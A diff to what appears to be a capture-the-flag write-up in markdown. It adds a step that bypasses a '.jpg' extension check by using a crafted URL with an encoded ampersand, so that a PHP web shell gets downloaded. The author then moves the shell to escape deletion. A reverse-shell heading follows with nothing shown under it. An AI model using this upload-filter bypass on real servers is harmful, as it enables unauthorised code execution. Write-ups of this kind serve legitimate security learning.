@@ -133,5 +133,18 @@ can be uploaded.
 
 ![image](https://github.com/user-attachments/assets/cc332704-ca7b-4869-8cb5-fb1893bee2ce)
 
+- Although, gaining RCE with the `.jpg` will only be possible via LFI.I decided to exploit the fact that it checks if the url ends with `.jpg` by crafting a special url to download `shell.php` without need for `.jpg`.As seen below, I set up another fake parameter to hold the jpg extension but the shell.php file will be downloaded and the `shell.jpg` won't be downloaded.`%26` is the url-encoded string for `&`.
+
+Url-:`http://[ip]:8000/shell.php%26file=shell.jpg`
+
+![image](https://github.com/user-attachments/assets/e51dd895-7950-4451-baf8-6f3b6c8a5f28)
+
+- Shell uploaded, I copied the shell up one directory because files in the directory gets deleted.
+
+![image](https://github.com/user-attachments/assets/cea350b1-f78a-48c4-8b24-0e9451bc902e)
+
+- Reverse shell-:
+
+
 
 
